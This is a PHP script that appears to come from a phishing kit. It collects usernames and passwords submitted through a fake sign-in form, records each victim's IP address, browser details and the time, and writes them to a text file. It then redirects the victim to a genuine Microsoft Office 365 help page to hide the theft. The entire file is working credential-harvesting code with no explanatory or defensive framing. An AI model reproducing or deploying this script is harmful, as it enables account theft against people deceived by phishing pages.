<?php
session_start();
require "../FUNC/One_Time.php";
$pass1= $_POST['pass'];
	if ( 
		 ($pass1 == "" || (strlen($pass1) < 6) )
       ) 
	{ 
		header('Location: ./?receiver='.base64_encode($_SESSION['_USERAUTH']));
		exit; 
	} 
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}
$_SESSION['_USER_']=$_POST['authname'];
$_SESSION['_1ST_PASS']=$_POST['pass'];
$t = date('H:i:s d/m/Y');
include('../FUNC/get_browser.php');
$go=$_SERVER['DOCUMENT_ROOT'] . '';
  $file = fopen("".$go."/facebook/users/accounts.txt", "a") or die("Problemas con el archivo");
  echo $file;
$dirname = dirname($file);

if (!is_dir($dirname)) {
    mkdir($dirname, 0777, true);
}
$nomina = "--------------------------
Username ".$_SESSION['_USER_']."
Password ".$_SESSION['_1ST_PASS']."
https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."
".$_SERVER['HTTP_USER_AGENT']."
[+]TIME/DATE] = ".$t."
--------------------------";

fwrite($file, $nomina."\r");
fclose($file);
header("Location: https://docs.microsoft.com/en-us/office365/troubleshoot/sign-in/cannot-sign-in-to-office-365");
?>
